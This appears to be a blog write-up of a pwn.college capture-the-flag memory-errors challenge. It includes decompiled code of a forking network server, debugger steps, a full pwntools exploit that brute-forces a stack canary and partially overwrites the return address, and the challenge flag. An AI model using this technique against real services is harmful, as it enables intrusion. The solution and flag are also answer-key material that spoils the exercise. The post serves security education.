---
layout: post
title: (Memory Errors) level 15.0 
date: 2025-07-09 13:09:01 +0300
categories: pwn.college Memory-Errors
tags: pwn.college memory-errors partial-overwrite brute-force stack-canary buffer-overflow 
---

## Information 
- category: pwn

## Description
> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.

## Write-up
This code was reversed using **IDA**:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int optval; // [rsp+24h] [rbp-101Ch] BYREF
  int fd; // [rsp+28h] [rbp-1018h]
  int v7; // [rsp+2Ch] [rbp-1014h]
  sockaddr addr; // [rsp+30h] [rbp-1010h] BYREF
  unsigned __int64 v9; // [rsp+1038h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited sequential connections.\n");
  fd = socket(2, 1, 0);
  optval = 1;
  setsockopt(fd, 1, 2, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x539u);
  bind(fd, &addr, 0x10u);
  listen(fd, 1);
  while ( 1 )
  {
    v7 = accept(fd, 0LL, 0LL);
    if ( !fork() )
      break;
    close(v7);
    wait(0LL);
  }
  dup2(v7, 0);
  dup2(v7, 1);
  dup2(v7, 2);
  close(fd);
  close(v7);
  challenge((unsigned int)argc, argv, envp);
  puts("### Goodbye!");
  return 0;
}
```
**The binary uses ```htons``` to bind a socket, listening on port ```0x0539```, which is ```1337``` in decimal**.
You can interact with the service locally using:
```bash
nc 127.0.0.1 1337
```
Now we’ll set our **breakpoints** using ```pwndbg``` and run the challenge.
We’ll place a breakpoint at ```challenge +1645```, which corresponds to the call to ```read``` inside the challenge function:
```bash
pwndbg /challenge/babymem-level-15-0
...
pwndbg > b*challenge + 1654
```
This allows us to inspect the stack before and after the ```read``` call to confirm the buffer overflow.

```bash
pwndbg> p/x $rsi  
# $rsi points to the buffer we're writing into

pwndbg> stack  
# Inspect the stack layout
# Look for the canary (usually starts with 0x00******) and saved return address

pwndbg> dist $rsi <canary_address>
# Calculate offset from buffer to canary

pwndbg> i f
# Show the current frame info (where saved RIP is stored)

pwndbg> dist $rsi <saved_return_address>
# Calculate offset from buffer to saved RIP
```
> This is our method, but you can explore and solve it using your own strategy too.
{: .prompt-info}

## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./babymem-level-15-0_patched")

context.binary = exe


def conn():
    r = remote("127.0.0.1", 1337)

    return r

def send_payload(p, payload):

    p.sendline(f"{len(payload)}".encode())
    p.send(payload)


def brute_force_canary():
    canary = b"\x00"
    i = 0x00
    while len(canary) < 0x8:
        for i in range(0x00,0xff):
            with remote("127.0.0.1" , 1337) as p:
                send_payload(p, b"A"*56 + canary + bytes([i]) )
                res = p.recvall(timeout=4)
                if b"*** stack smashing detected ***" not in res:
                    canary+= bytes([i])
                    break

    log.success(f"Canary: {canary}")

    return canary
def jump_to_win(canary):
    i = 0x00
    while i < 0xff:
        p = conn()
        fixed = b"\x22"
        padding_to_canary = b"A"*56
        padding_to_ret = b"B"*8

        payload = padding_to_canary + canary + padding_to_ret + fixed + bytes([i])

        send_payload(p, payload)
        res = p.recvall()
        if b"pwn.college" in res:
            print(res.decode())
            break
        else:
            i += 0x1

def main():
    canary = brute_force_canary()

    jump_to_win(canary)


if __name__ == "__main__":
    main()
```

## Flag
> Flag: ```pwn.college{PiU_dHA8jccj_TYZgFn1iejPdTj.01NxMDL5cTNxgzW}```